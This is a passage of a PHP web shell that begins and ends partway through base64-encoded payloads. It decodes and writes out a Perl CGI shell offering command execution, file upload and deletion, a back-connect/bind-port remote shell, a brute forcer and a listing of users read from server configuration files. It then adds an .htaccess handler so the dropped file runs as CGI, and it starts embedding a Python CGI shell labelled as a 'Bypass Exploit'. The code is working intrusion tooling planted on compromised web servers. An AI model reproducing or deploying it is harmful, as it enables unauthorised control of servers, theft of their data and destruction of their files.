msoJEZpbGUpOwoJCWV4aXQgMDsKCX1lbHNlCgl7CgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmluZHBlcmwpOwoJCWlmKC13ICIvdG1wIikKCQl7CgkJCSRGaWxlPSIvdG1wL2JpbmRwb3J0LnBsIjsJCgkJfWVsc2UKCQl7CgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiaW5kcG9ydC5wbCI7CgkJfQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlzeXN0ZW0oInBlcmwgYmluZHBvcnQucGwgJENsaWVudFBvcnQiKTsKCQl1bmxpbmsoJEZpbGUpOwoJCWV4aXQgMDsKCX0KfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgIEFycmF5IExpc3QgRGlyZWN0b3J5CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJtRGlyKCQpIAp7CglteSAkZGlyID0gc2hpZnQ7CiAgICBpZihvcGVuZGlyKERJUiwkZGlyKSkKCXsKCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoRElSKSkKCQl7CgkJCWlmKCgkZmlsZSBuZSAiLiIpICYmICgkZmlsZSBuZSAiLi4iKSkKCQkJewoJCQkJJGZpbGU9ICRkaXIuJFBhdGhTZXAuJGZpbGU7CgkJCQlpZigtZCAkZmlsZSkKCQkJCXsKCQkJCQkmUm1EaXIoJGZpbGUpOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCXVubGluaygkZmlsZSk7CgkJCQl9CgkJCX0KCQl9CgkJY2xvc2VkaXIoRElSKTsKCX0KCWlmKCFybWRpcigkZGlyKSkKCXsKCQkKCX0KfQpzdWIgRmlsZU93bmVyKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZSAkZmlsZSkKCXsKCQkoJHVpZCwkZ2lkKSA9IChzdGF0KCRmaWxlKSlbNCw1XTsKCQlpZigkV2luTlQpCgkJewoJCQlyZXR1cm4gIj8/PyI7CgkJfQoJCWVsc2UKCQl7CgkJCSRuYW1lPWdldHB3dWlkKCR1aWQpOwoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7CgkJCXJldHVybiAkbmFtZS4iLyIuJGdyb3VwOwoJCX0KCX0KCXJldHVybiAiPz8/IjsKfQpzdWIgUGFyZW50Rm9sZGVyKCQpCnsKCW15ICRwYXRoID0gc2hpZnQ7CglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7CgljaG9wKCRwYXRoID0gYCRDb21tYCk7CglyZXR1cm4gJHBhdGg7Cn0Kc3ViIEZpbGVQZXJtcygkKQp7CglteSAkZmlsZSA9IHNoaWZ0OwoJbXkgJHVyID0gIi0iOwoJbXkgJHV3ID0gIi0iOwoJaWYoLWUgJGZpbGUpCgl7CgkJaWYoJFdpbk5UKQoJCXsKCQkJaWYoLXIgJGZpbGUpeyAkdXIgPSAiciI7IH0KCQkJaWYoLXcgJGZpbGUpeyAkdXcgPSAidyI7IH0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3OwoJCX1lbHNlCgkJewoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOwoJCQkkcmVzdWx0ID0gc3ByaW50ZigiJTA0byIsICRtb2RlICYgMDc3NzcpOwoJCQlyZXR1cm4gJHJlc3VsdDsKCQl9Cgl9CglyZXR1cm4gIjAwMDAiOwp9CnN1YiBGaWxlTGFzdE1vZGlmaWVkKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZSAkZmlsZSkKCXsKCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07CgkJKCRkLCRtLCR5LCRoLCRpKSA9IChsb2NhbHRpbWUoJGxhKSlbMyw0LDUsMiwxXTsKCQkkeSA9ICR5ICsgMTkwMDsKCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87CgkJJGxtdGltZSA9IHNwcmludGYoIiUwMmQvJXMvJTRkICUwMmQ6JTAyZCIsJGQsJG1vbnRoWyRtXSwkeSwkaCwkaSk7CgkJcmV0dXJuICRsbXRpbWU7Cgl9CglyZXR1cm4gIj8/PyI7Cn0Kc3ViIEZpbGVTaXplKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZiAkZmlsZSkKCXsKCQlyZXR1cm4gLXMgJGZpbGU7Cgl9CglyZXR1cm4gIjAiOwoKfQpzdWIgUGFyc2VGaWxlU2l6ZSgkKQp7CglteSAkc2l6ZSA9IHNoaWZ0OwoJaWYoJHNpemUgPD0gMTAyNCkKCXsKCQlyZXR1cm4gJHNpemUuICIgQiI7Cgl9CgllbHNlCgl7CgkJaWYoJHNpemUgPD0gMTAyNCoxMDI0KSAKCQl7CgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7CgkJCXJldHVybiAkc2l6ZS4iIEtCIjsKCQl9CgkJZWxzZSAKCQl7CgkJCSRzaXplID0gc3ByaW50ZigiJS4yZiIsJHNpemUgLyAxMDI0IC8gMTAyNCk7CgkJCXJldHVybiAkc2l6ZS4iIE1CIjsKCQl9Cgl9Cn0Kc3ViIHRyaW0oJCkKewoJbXkgJHN0cmluZyA9IHNoaWZ0OwoJJHN0cmluZyA9fiBzL15ccysvLzsKCSRzdHJpbmcgPX4gcy9ccyskLy87CglyZXR1cm4gJHN0cmluZzsKfQpzdWIgQWRkU2xhc2hlcygkKQp7CglteSAkc3RyaW5nID0gc2hpZnQ7Cgkkc3RyaW5nPX4gcy9cXC9cXFxcL2c7CglyZXR1cm4gJHN0cmluZzsKfQpzdWIgTGlzdERpcgp7CglteSAkcGF0aCA9ICRDdXJyZW50RGlyLiRQYXRoU2VwOwoJJHBhdGg9fiBzL1xcXFwvXFwvZzsKCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgYWN0aW9uPSckU2NyaXB0TG9jYXRpb24nPjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOwoJaWYoLWQgJHBhdGgpCgl7CgkJbXkgQGZuYW1lID0gKCk7CgkJbXkgQGRuYW1lID0gKCk7CgkJaWYob3BlbmRpcihESVIsJHBhdGgpKQoJCXsKCQkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpCgkJCXsKCQkJCSRmPSRwYXRoLiRmaWxlOwoJCQkJaWYoLWQgJGYpCgkJCQl7CgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCXB1c2goQGZuYW1lLCRmaWxlKTsKCQkJCX0KCQkJfQoJCQljbG9zZWRpcihESVIpOwoJCX0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7CgkJQGRuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGRuYW1lOwoJCSRyZXN1bHQgLj0gIjxkaXY+PHRhYmxlIHdpZHRoPSc5MCUnIGNsYXNzPSdsaXN0ZGlyJz4KCgkJPHRyIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiAjM2UzZTNlJz48dGg+RmlsZSBOYW1lPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+RmlsZSBTaXplPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+T3duZXI8L3RoPgoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5QZXJtaXNzaW9uPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+TGFzdCBNb2RpZmllZDwvdGg+CgkJPHRoIHN0eWxlPSd3aWR0aDoyNjBweDsnPkFjdGlvbjwvdGg+PC90cj4iOwoJCW15ICRzdHlsZT0ibGluZSI7CgkJbXkgJGk9MDsKCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpCgkJewoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOwoJCQkkZCA9ICZ0cmltKCRkKTsKCQkJJGRpcm5hbWU9JGQ7CgkJCWlmKCRkIGVxICIuLiIpIAoJCQl7CgkJCQkkZCA9ICZQYXJlbnRGb2xkZXIoJHBhdGgpOwoJCQl9CgkJCWVsc2lmKCRkIGVxICIuIikgCgkJCXsKCQkJCSRkID0gJHBhdGg7CgkJCX0KCQkJZWxzZSAKCQkJewoJCQkJJGQgPSAkcGF0aC4kZDsKCQkJfQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+CgoJCQk8dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+PGEgIGhyZWY9Jz9hPWd1aSZkPSIuJGQuIic+WyAiLiRkaXJuYW1lLiIgXTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZD5ESVI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRkKS4iJywnIi4kZGlybmFtZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oIi4kaS4iLCciLiRkaXJuYW1lLiInKVwiID4iLiZGaWxlUGVybXMoJGQpLiI8L3NwYW4+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZCkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZGlybmFtZScsJyIuJkFkZFNsYXNoZXMoJkFkZFNsYXNoZXMoJGQpKS4iJylcIj5SZW5hbWU8L2E+ICB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGRpcjogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8L3RyPiI7CgkJCSRpKys7CgkJfQoJCWZvcmVhY2ggbXkgJGYgKEBmbmFtZSkKCQl7CgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlPSRmOwoJCQkkZiA9ICRwYXRoLiRmOwoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7CgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7Jz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4kcGF0aC4iJmM9ZWRpdCUyMCIuJGZpbGUuIic+Ii4kZmlsZS4iPC9hPjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkPiIuJlBhcnNlRmlsZVNpemUoJkZpbGVTaXplKCRmKSkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGYpLiInLCciLiRmaWxlLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgkaSwnJGZpbGUnKVwiID4iLiZGaWxlUGVybXMoJGYpLiI8L3NwYW4+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZikuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz5FZGl0PC9hPiB8IDxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZmlsZScsJ2YnKVwiPlJlbmFtZTwvYT4gfCA8YSBocmVmPSc/YT1kb3dubG9hZCZvPWdvJmY9Ii4kZi4iJz5Eb3dubG9hZDwvYT4gfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBmaWxlOiAkZmlsZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsKCQkJJGkrKzsKCQl9CgkJJHJlc3VsdCAuPSAiPC90YWJsZT48L2Rpdj4iOwoJfQoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRyeSB0byBWaWV3IExpc3QgVXNlcgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBWaWV3RG9tYWluVXNlcgp7CglvcGVuIChkb21haW5zLCAnL2V0Yy9uYW1lZC5jb25mJykgb3IgJGVycj0xOwoJbXkgQGNuenMgPSA8ZG9tYWlucz47CgljbG9zZSBkMG1haW5zOwoJbXkgJHN0eWxlPSJsaW5lIjsKCW15ICRyZXN1bHQ9IjxoNT48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+SG9hbmcgU2EgLSBUcnVvbmcgU2E8L2ZvbnQ+PC9oNT4iOwoJaWYgKCRlcnIpCgl7CgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7CgkJcmV0dXJuICRyZXN1bHQ7Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJzx0YWJsZT48dHI+PHRoPkRvbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOwoJfQoJZm9yZWFjaCBteSAkb25lIChAY256cykKCXsKCQlpZigkb25lID1+IG0vLio/em9uZSAiKC4qPykiIHsvKQoJCXsJCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlbmFtZT0gIi9ldGMvdmFsaWFzZXMvIi4kb25lOwoJCQkkb3duZXIgPSBnZXRwd3VpZCgoc3RhdCgkZmlsZW5hbWUpKVs0XSk7CgkJCSRyZXN1bHQgLj0gJzx0ciBjbGFzcz0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPicuJG9uZS4nIDwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7CgkJfQoJfQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFZpZXcgTG9nCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFZpZXdMb2cKewoJaWYoJFdpbk5UKQoJewoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Eb24ndCBydW4gb24gV2luZG93czwvZm9udD48L2gyPiI7Cgl9CglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOwoJbXkgQHBhdGhsb2c9KAoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nJywKCQkJCScvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cnLAoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZycKCQkJCSk7CglteSAkaT0wOwoJbXkgJHBlcm1zOwoJbXkgJHNsOwoJZm9yZWFjaCBteSAkbG9nIChAcGF0aGxvZykKCXsKCQlpZigtdyAkbG9nKQoJCXsKCQkJJHBlcm1zPSJPSyI7CgkJfWVsc2UKCQl7CgkJCWNob3AoJHNsID0gYGxuIC1zICRsb2cgZXJyb3JfbG9nXyRpYCk7CgkJCWlmKCZ0cmltKCRscykgZXEgIiIpCgkJCXsKCQkJCWlmKC1yICRscykKCQkJCXsKCQkJCQkkcGVybXM9Ik9LIjsKCQkJCQkkbG9nPSJlcnJvcl9sb2dfIi4kaTsKCQkJCX0KCQkJfWVsc2UKCQkJewoJCQkJJHBlcm1zPSI8Zm9udCBzdHlsZT0nY29sb3I6IHJlZDsnPkNhbmNlbDxmb250PiI7CgkJCX0KCQl9CgkJJHJlc3VsdCAuPTw8RU5EOwoJCTx0cj4KCgkJCTxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPgoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dfJGknKS52YWx1ZT0nbGVzcyAnICsgdGhpcy52YWx1ZTsiIHZhbHVlPSIkbG9nIiBzaXplPSc1MCcvPjwvdGQ+CgkJCTx0ZD48aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVHJ5IiAvPjwvdGQ+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJsb2dfJGkiIG5hbWU9ImMiIHZhbHVlPSJsZXNzICRsb2ciLz4KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiIC8+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciIgLz4KCQkJPC9mb3JtPgoJCQk8dGQ+JHBlcm1zPC90ZD4KCgkJPC90cj4KRU5ECgkJJGkrKzsKCX0KCSRyZXN1bHQgLj0iPC90YWJsZT4iOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiZSZWFkUGFyc2U7CiZHZXRDb29raWVzOwoKJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsKJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9OwokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9OwokUnVuQ29tbWFuZCA9ICRpbnsnYyd9OwokVHJhbnNmZXJGaWxlID0gJGlueydmJ307CiRPcHRpb25zID0gJGlueydvJ307CiRBY3Rpb24gPSAkaW57J2EnfTsKCiRBY3Rpb24gPSAiY29tbWFuZCIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAmdHJpbSgkaW57J2QnfSk7CiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQokUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSIgaWYoJFJ1bkNvbW1hbmQgZXEgIiIpOwpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7CgokTG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7CgppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgCQkjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luCnsKCSZQZXJmb3JtTG9naW47Cn1lbHNpZigkQWN0aW9uIGVxICJndWkiKSAjIEdVSSBkaXJlY3RvcnkKewoJJlByaW50UGFnZUhlYWRlcjsKCWlmKCEkV2luTlQpCgl7CgkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOwoJCWlmKCEoJGNobW9kIGVxIDApKQoJCXsKCQkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOwoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOwoJCQljaG9wKCRyZXN1bHQ9IGBjaG1vZCAkY2htb2QgIiRmaWxlImApOwoJCQlpZigmdHJpbSgkcmVzdWx0KSBlcSAiIikKCQkJewoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJCQl9ZWxzZQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJCQl9CgkJfQoJfQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9OwoJaWYoISRyZW5hbWUgZXEgIiIpCgl7CgkJaWYocmVuYW1lKCRUcmFuc2ZlckZpbGUsJHJlbmFtZSkpCgkJewoJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7CgkJfWVsc2UKCQl7CgkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7CgkJfQoJfQoJJHJlbW92ZT0kaW57J3JlbW92ZSd9OwoJaWYoJHJlbW92ZSBuZSAiIikKCXsKCQkkcm0gPSAkQ3VycmVudERpci4kUGF0aFNlcC4kcmVtb3ZlOwoJCWlmKC1kICRybSkKCQl7CgkJCSZSbURpcigkcm0pOwoJCX1lbHNlCgkJewoJCQlpZih1bmxpbmsoJHJtKSkKCQkJewoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJCQl9ZWxzZQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJCQl9CQkJCgkJfQoJfQoJcHJpbnQgJkxpc3REaXI7Cgp9CmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKQkJCQkgCSMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kCnsKCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCXByaW50ICZFeGVjdXRlQ29tbWFuZDsKfQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUKewoJJlByaW50UGFnZUhlYWRlcjsKCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpCgl7CgkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJfWVsc2UKCXsKCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJfQoJcHJpbnQgJkxpc3REaXI7Cn0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgCQkJCQkjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoKCXByaW50ICZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImJhY2tiaW5kIikgCQkJCSMgdXNlciB3YW50cyB0byBiYWNrIGNvbm5lY3Qgb3IgYmluZCBwb3J0CnsKCSZQcmludFBhZ2VIZWFkZXIoImNsaWVudHBvcnQiKTsKCXByaW50ICZCYWNrQmluZDsKfQplbHNpZigkQWN0aW9uIGVxICJicnV0ZWZvcmNlciIpIAkJCSMgdXNlciB3YW50cyB0byBicnV0ZSBmb3JjZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJcHJpbnQgJkJydXRlRm9yY2VyOwp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CglwcmludCAmRG93bmxvYWRGaWxlOwp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUKewoJJlByaW50UGFnZUhlYWRlcjsKCXByaW50ICZWaWV3TG9nOwoKfWVsc2lmKCRBY3Rpb24gZXEgImRvbWFpbnN1c2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbGlzdCB1c2VyL2RvbWFpbgp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJcHJpbnQgJlZpZXdEb21haW5Vc2VyOwp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0KJlByaW50UGFnZUZvb3Rlcjs=';
    $file = fopen("cgi2012.izo", "w+");
    $write = fwrite($file, base64_decode($cgi2012));
    fclose($file);
    chmod("cgi2012.izo", 0755);
    echo " &lt;iframe src=cgi2012/cgi2012.izo width=96% height=76% frameborder=0&gt;&lt;/iframe&gt;
 
 &lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'python')) {
    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;
 +--==[ python  Bypass Exploit ]==--+ 
 &lt;/b&gt;&lt;br&gt;&lt;br&gt;";
    mkdir('python', 0755);
    chdir('python');
    $kokdosya = ".htaccess";
    $dosya_adi = "$kokdosya";
    $dosya = fopen($dosya_adi, 'w') or die("Dosya a&#231;&#305;lamad&#305;!");
    $metin = "AddHandler cgi-script .izo";
    fwrite($dosya, $metin);
    fclose($dosya);
    $pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
